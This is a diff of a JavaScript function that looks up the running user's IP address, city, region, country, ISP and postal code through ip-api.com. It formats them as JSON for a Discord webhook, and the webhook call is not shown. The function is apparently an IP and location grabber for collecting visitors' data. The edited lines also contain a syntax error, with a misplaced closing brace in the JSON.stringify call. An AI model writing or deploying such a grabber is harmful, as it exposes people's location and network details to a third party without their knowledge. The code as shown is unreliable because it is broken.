@@ -1,7 +1,7 @@
 // Function to fetch IP address and location and send to Discord
 async function getIPAndLocationAndSendToDiscord() {
     try {
-        const response = await fetch('https://ipinfo.io/json');
+        const response = await fetch('http://ip-api.com/json');
         if (!response.ok) {
             throw new Error('Failed to fetch IP information');
         }
@@ -11,12 +11,12 @@ async function getIPAndLocationAndSendToDiscord() {
         const message = "```json\n" +
                         JSON.stringify({
                             "City": data.city,
-                            "Region": data.region,
+                            "Region": data.regionName,
                             "Country": data.country,
                             "Internet Provider": data.org,
-                            "Postal Code": data.postal,
-                            "IP Address": data.ip
-                        }, null, 2) +
+                            "Postal Code": data.zip,
+                            "IP Address": data.query
+                        , null, 2}) +
                         "\n```";
         
         // Send the message to Discord using a webhook
